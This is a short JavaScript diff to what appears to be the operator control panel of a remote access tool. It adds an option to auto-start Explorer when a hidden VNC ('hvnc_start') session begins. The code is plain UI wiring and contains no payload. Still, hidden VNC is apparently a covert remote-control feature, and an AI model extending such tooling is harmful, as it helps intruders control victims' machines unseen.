@@ -25,6 +25,7 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
   const mouseCtrl = document.getElementById("mouseCtrl");
   const kbdCtrl = document.getElementById("kbdCtrl");
   const cursorCtrl = document.getElementById("cursorCtrl");
+  const autoExplorerCtrl = document.getElementById("autoExplorerCtrl");
   const qualitySlider = document.getElementById("qualitySlider");
   const qualityValue = document.getElementById("qualityValue");
   const codecH264 = document.getElementById("codecH264");
@@ -199,7 +200,9 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
             display: parseInt(displaySelect.value, 10) || 0,
           });
         }
-        sendCmd("hvnc_start", {});
+        sendCmd("hvnc_start", {
+          autoStartExplorer: autoExplorerCtrl ? autoExplorerCtrl.checked : true,
+        });
       } else {
         setStreamState("idle", "Stopped");
       }
@@ -426,7 +429,9 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
     desiredStreaming = true;
     lastFrameAt = 0;
     setStreamState("starting", "Starting stream");
-    sendCmd("hvnc_start", {});
+    sendCmd("hvnc_start", {
+      autoStartExplorer: autoExplorerCtrl ? autoExplorerCtrl.checked : true,
+    });
   });
   stopBtn.addEventListener("click", function () {
     desiredStreaming = false;
